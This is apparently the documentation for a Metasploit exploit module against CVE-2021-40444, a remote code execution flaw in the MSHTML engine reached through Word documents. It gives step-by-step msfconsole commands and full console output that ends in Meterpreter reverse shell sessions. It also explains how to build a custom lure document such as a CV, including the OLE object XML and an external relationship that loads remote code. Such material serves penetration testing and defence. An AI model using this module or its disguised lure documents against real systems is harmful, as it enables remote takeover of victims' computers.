This vulnerability is known as CVE-2021-40444, the exploitation of which allows malicious code to be executed remotely.

The vulnerability reside in MSHTML (the Internet Explorer engine). So few people use Internet Explorer these days (and
Microsoft strongly recommends using its new Edge browser), the old browser is still a component of modern operating systems
and some programs use its engine to manage Web content.

Some Microsoft Office applications, like Word or PowerPoint, are very dependent.

## Vulnerable Application

The malicious document exploiting CVE-2021-40444 loads remote HTML code with active JavaScript.

The attacking code dynamically creates a new HTMLFile ActiveX object in-memory and injects into it JavaScript code that
loads an HTML ActiveX installation object. The new object downloads a remote compressed .cab archive.

The cab archive hide  a file which is supposed to describe the object’s installation parameters, but in this case is
used to disguise the DLL payload.

### Make your lab

You need official version of Microsoft Office installed (using a valid licence). And stay unpatched for this.

The exploitation don't work on unlicensed version.

Tested on Microsoft Windows 10 1909 w/ Microsoft Office Word 2016.

## Verification Steps

1. Start `msfconsole`
2. `use exploit/windows/fileformat/word_mshtml_rce`
3. `set SRVHOST [IP]`
4. `set LHOST [IP]`
5. `run`

## Options

**CUSTOMTEMPLATE**

A DOCX file that will be used as a template to build the exploit.

**OBFUSCATE**

Obfuscate JavaScript content. Default: true

## Scenarios

### Basic use

1. Generate the exploit as following.

```
msf6 exploit(windows/fileformat/word_mshtml_rce) > use exploit/windows/fileformat/word_mshtml_rce
[*] Using configured payload windows/x64/meterpreter/reverse_tcp
msf6 exploit(windows/fileformat/word_mshtml_rce) > set SRVHOST 172.20.7.36
SRVHOST => 172.20.7.36
msf6 exploit(windows/fileformat/word_mshtml_rce) > set LHOST 172.20.7.36
LHOST => 172.20.7.36
msf6 exploit(windows/fileformat/word_mshtml_rce) > set VERBOSE true
VERBOSE => true
msf6 exploit(windows/fileformat/word_mshtml_rce) > run
[*] Using URL: http://172.20.7.36:8080/x58G8ZxLbZ
[*] Server started.
[*] CVE-2021-40444: Generate a malicious docx file
[*] Using template '/opt/metasploit/data/exploits/cve-2021-40444.docx'
[*] Parsing item from template: [Content_Types].xml
[*] Parsing item from template: _rels/
[*] Parsing item from template: _rels/.rels
[*] Parsing item from template: docProps/
[*] Parsing item from template: docProps/core.xml
[*] Parsing item from template: docProps/app.xml
[*] Parsing item from template: word/
[*] Parsing item from template: word/theme/
[*] Parsing item from template: word/theme/theme1.xml
[*] Parsing item from template: word/styles.xml
[*] Parsing item from template: word/settings.xml
[*] Parsing item from template: word/document.xml
[*] Parsing item from template: word/_rels/
[*] Parsing item from template: word/_rels/document.xml.rels
[*] Parsing item from template: word/fontTable.xml
[*] Parsing item from template: word/webSettings.xml
[*] Injecting payload in docx document
[*] Finalizing docx 'msf.docx'
[+] msf.docx stored at /home/mekhalleh/.msf4/local/msf.docx
```

2. Execute the DOCX document on a remote vulnerable system.

```
[*] 172.20.7.36      word_mshtml_rce - Sending HTML Payload
[*] 172.20.7.36      word_mshtml_rce - Obfuscate JavaScript content
[*] 172.20.7.36      word_mshtml_rce - Sending HTML Payload
[*] 172.20.7.36      word_mshtml_rce - Obfuscate JavaScript content
[*] 172.20.7.36      word_mshtml_rce - Sending HTML Payload
[*] 172.20.7.36      word_mshtml_rce - Obfuscate JavaScript content
[*] 172.20.7.36      word_mshtml_rce - Sending CAB Payload
[*] 172.20.7.36      word_mshtml_rce - Data block added w/ checksum: cc1d5e18
[*] 172.20.7.36      word_mshtml_rce - Data block added w/ checksum: 7e6fb805
[*] 172.20.7.36      word_mshtml_rce - Sending CAB Payload
[*] 172.20.7.36      word_mshtml_rce - Data block added w/ checksum: 620a35dd
[*] 172.20.7.36      word_mshtml_rce - Data block added w/ checksum: 7e6fb805
[*] Sending stage (200262 bytes) to 172.20.7.36
[*] Meterpreter session 1 opened (172.20.7.36:4444 -> 172.20.7.36:57920) at 2021-11-05 16:41:13 +0400
```

### Using custom template

1. Generate a custom DOCX template

You need to create new office document and personalizing it by your own model (CV, Report, ...).

The easy way, copy and paste (keep formating) from `data/exploits/cve-2021-40444.docx`.

You can copy this anywhere in the document.

Save the document and unpack this.

Check that `word/documment.xml` contains something like:

```
<w:object w:dxaOrig="4320" w:dyaOrig="4320">
  <v:shapetype id="_x0000_t75" coordsize="21600,21600" o:spt="75" o:preferrelative="t" path="m@4@5l@4@11@9@11@9@5xe" filled="f" stroked="f">
    <v:stroke joinstyle="miter"/>
    <v:formulas>
      <v:f eqn="if lineDrawn pixelLineWidth 0"/>
      <v:f eqn="sum @0 1 0"/>
      <v:f eqn="sum 0 0 @1"/>
      <v:f eqn="prod @2 1 2"/>
      <v:f eqn="prod @3 21600 pixelWidth"/>
      <v:f eqn="prod @3 21600 pixelHeight"/>
      <v:f eqn="sum @0 0 1"/>
      <v:f eqn="prod @6 1 2"/>
      <v:f eqn="prod @7 21600 pixelWidth"/>
      <v:f eqn="sum @8 21600 0"/>
      <v:f eqn="prod @7 21600 pixelHeight"/>
      <v:f eqn="sum @10 21600 0"/>
    </v:formulas>
    <v:path o:extrusionok="f" gradientshapeok="t" o:connecttype="rect"/>
    <o:lock v:ext="edit" aspectratio="t"/>
  </v:shapetype>
  <v:shape id="_x0000_i1025" type="#_x0000_t75" style="width:3.75pt;height:3.75pt" o:ole="">
    <v:imagedata r:id="rId4" o:title="" cropbottom="64444f" cropright="64444f"/>
  </v:shape>
  <o:OLEObject Type="Link" ProgID="TARGET_HERE" ShapeID="_x0000_i1025" DrawAspect="Content" r:id="rId5" UpdateMode="OnCall">
    <o:LinkType>EnhancedMetaFile</o:LinkType>
    <o:LockedField>false</o:LockedField>
    <o:FieldCodes>\f 0</o:FieldCodes>
  </o:OLEObject>
</w:object>
```

Check that `word/_rels/document.xml.rels` have good relation to the above thing:

```
<Relationship Id="rId32" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/oleObject" Target="TARGET_HERE" TargetMode="External"/>
<Relationship Id="rId31" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="NULL" TargetMode="External"/>
```

Pack that to create word document to used as template.

2. Use the template with `msfconsole`.

```
msf6 exploit(windows/fileformat/word_mshtml_rce) > use exploit/windows/fileformat/word_mshtml_rce
[*] Using configured payload windows/x64/meterpreter/reverse_tcp
msf6 exploit(windows/fileformat/word_mshtml_rce) > set customtemplate /tmp/readme.docx
customtemplate => /tmp/readme.docx
msf6 exploit(windows/fileformat/word_mshtml_rce) > set srvhost 172.20.7.36
srvhost => 172.20.7.36
msf6 exploit(windows/fileformat/word_mshtml_rce) > set lhost 172.20.7.36
lhost => 172.20.7.36
msf6 exploit(windows/fileformat/word_mshtml_rce) > set verbose true
verbose => true
msf6 exploit(windows/fileformat/word_mshtml_rce) > run
[*] Using URL: http://172.20.7.36:8080/c6RhuAJ0fcW7
[*] Server started.
[*] CVE-2021-40444: Generate a malicious docx file
[*] Using template '/tmp/readme.docx'
[*] Parsing item from template: [Content_Types].xml
[*] Parsing item from template: _rels/
[*] Parsing item from template: _rels/.rels
[*] Parsing item from template: docProps/
[*] Parsing item from template: docProps/core.xml
[*] Parsing item from template: docProps/app.xml
[*] Parsing item from template: word/
[*] Parsing item from template: word/theme/
[*] Parsing item from template: word/theme/theme1.xml
[*] Parsing item from template: word/styles.xml
[*] Parsing item from template: word/settings.xml
[*] Parsing item from template: word/endnotes.xml
[*] Parsing item from template: word/footnotes.xml
[*] Parsing item from template: word/document.xml
[*] Parsing item from template: word/media/
[*] Parsing item from template: word/media/image11.jpg
[*] Parsing item from template: word/media/image17.jpg
[*] Parsing item from template: word/media/image4.png
[*] Parsing item from template: word/media/image18.jpg
[*] Parsing item from template: word/media/image10.jpg
[*] Parsing item from template: word/media/image15.jpg
[*] Parsing item from template: word/media/image19.jpg
[*] Parsing item from template: word/media/image3.jpg
[*] Parsing item from template: word/media/image7.jpg
[*] Parsing item from template: word/media/image14.png
[*] Parsing item from template: word/media/image1.png
[*] Parsing item from template: word/media/image8.jpg
[*] Parsing item from template: word/media/image9.jpg
[*] Parsing item from template: word/media/image16.jpg
[*] Parsing item from template: word/media/image12.jpg
[*] Parsing item from template: word/media/image13.jpg
[*] Parsing item from template: word/media/image2.png
[*] Parsing item from template: word/media/image5.png
[*] Parsing item from template: word/media/image6.jpg
[*] Parsing item from template: word/_rels/
[*] Parsing item from template: word/_rels/settings.xml.rels
[*] Parsing item from template: word/_rels/document.xml.rels
[*] Parsing item from template: word/fontTable.xml
[*] Parsing item from template: word/webSettings.xml
[*] Parsing item from template: word/numbering.xml
[*] Injecting payload in docx document
[*] Finalizing docx 'msf.docx'
[+] msf.docx stored at /home/mekhalleh/.msf4/local/msf.docx
```

3. Execute the DOCX document on a remote vulnerable system.

```
[*] 172.20.7.36      word_mshtml_rce - Sending HTML Payload
[*] 172.20.7.36      word_mshtml_rce - Obfuscate JavaScript content
[*] 172.20.7.36      word_mshtml_rce - Sending HTML Payload
[*] 172.20.7.36      word_mshtml_rce - Obfuscate JavaScript content
[*] 172.20.7.36      word_mshtml_rce - Sending HTML Payload
[*] 172.20.7.36      word_mshtml_rce - Obfuscate JavaScript content
[*] 172.20.7.36      word_mshtml_rce - Sending CAB Payload
[*] 172.20.7.36      word_mshtml_rce - Data block added w/ checksum: f3189fad
[*] 172.20.7.36      word_mshtml_rce - Data block added w/ checksum: 7e6fb805
[*] 172.20.7.36      word_mshtml_rce - Sending CAB Payload
[*] 172.20.7.36      word_mshtml_rce - Data block added w/ checksum: 3b8886e6
[*] 172.20.7.36      word_mshtml_rce - Data block added w/ checksum: 7e6fb805
[*] Sending stage (200262 bytes) to 172.20.7.36
[*] Meterpreter session 1 opened (172.20.7.36:4444 -> 172.20.7.36:59004) at 2021-11-08 19:51:01 +0400
```

## References

  1. <https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-40444>
  2. <https://www.sentinelone.com/blog/peeking-into-cve-2021-40444-ms-office-zero-day-vulnerability-exploited-in-the-wild/>
  3. <http://download.microsoft.com/download/4/d/a/4da14f27-b4ef-4170-a6e6-5b1ef85b1baa/[ms-cab].pdf>
  4. <https://github.com/lockedbyte/CVE-2021-40444/blob/master/REPRODUCE.md>
  5. <https://github.com/klezVirus/CVE-2021-40444>
